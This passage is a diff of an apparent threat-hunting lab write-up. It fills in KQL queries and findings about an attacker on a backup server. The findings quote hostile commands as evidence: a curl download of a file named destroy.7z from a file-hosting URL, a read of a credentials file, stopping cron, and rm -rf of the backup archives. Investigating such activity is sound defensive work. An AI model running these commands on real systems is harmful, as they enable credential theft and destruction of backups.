@@ -121,53 +121,77 @@ DeviceProcessEvents
 ---
 ## :triangular_flag_on_post: Flag 7 – What command revealed scheduled jobs on the system?
 
-**Finding**: 
+**Finding**: `cat /etc/crontab` at `2025-11-24T14:16:08.703052Z`
 
 **Thoughts**:
 
 **KQL Query**:
 ```
+DeviceProcessEvents
+| where DeviceName contains "azuki-backupsrv"
+| where ProcessCommandLine contains "crontab"
 ```
-<img/>
+<img width="862" height="405" alt="image" src="https://github.com/user-attachments/assets/07d67caf-580c-4614-b520-8591778a60ff" />
 
 ---
 
 ## :triangular_flag_on_post: Flag 8 – What command downloaded external tools?
 
-**Finding**:
+**Finding**: `curl -L -o destroy.7z https[:]//litter[.]catbox[.]moe/io523y[.]7z` at `2025-11-25T05:45:34.259149Z`
 
 **KQL Query**:
 ```
-
+DeviceProcessEvents
+| where DeviceName contains "azuki-backupsrv"
+| where ProcessCommandLine contains "curl"
 ```
-<img />
+
+<img width="807" height="451" alt="image" src="https://github.com/user-attachments/assets/35f9d851-18a7-492f-8c2b-1cd7c634b917" />
+
 
 ---
 
 ## :triangular_flag_on_post: Flag 9 – What command accessed stored credentials?
 
-**Finding**:   
+**Finding**: `cat /backups/configs/all-credentials.txt` at `2025-11-24T14:14:14.217788Z`
 
 **REG Path**: 
 
 **KQL Query**:
 ```
-
+DeviceProcessEvents
+| where DeviceName contains "azuki-backupsrv"
+| where ProcessCommandLine contains ".txt"
 ```
-<img />
+<img width="881" height="416" alt="image" src="https://github.com/user-attachments/assets/d18004e8-3964-464d-9a2a-ff2fb35bba56" />
+
 ---
 ## :triangular_flag_on_post: Flag 10 - 12 – How did the attacker disable backup services and destroy backup files?
 
-**Finding**: 
-
-**Command Used**:
+**Finding**: The attacker ran `systemctl stop cron`, `systemctl disable cron`, and  `rm -rf /backups/archives` starting at `2025-11-25T05:47:02.660493Z `
 
 
 **KQL Query**:
 ```
-
+DeviceProcessEvents
+| where DeviceName contains "azuki-backupsrv"
+| where ProcessCommandLine contains "systemctl"
+| where ProcessCommandLine contains "stop"
 ```
-<img />
+```
+DeviceProcessEvents
+| where DeviceName contains "azuki-backupsrv"
+| where ProcessCommandLine contains "systemctl"
+| where ProcessCommandLine contains "disable"
+```
+```
+DeviceProcessEvents
+| where DeviceName contains "azuki-backupsrv"
+| where ProcessCommandLine contains "rm"
+| where ProcessCommandLine contains "backups"
+```
+<img width="1057" height="411" alt="image" src="https://github.com/user-attachments/assets/f70980b3-a2eb-4a4e-9844-32af0a7887bc" />
+
 ---
 
 ## :triangular_flag_on_post: Flag 13 & 14 – What tool did the attacker use to execute commands on remote systems?
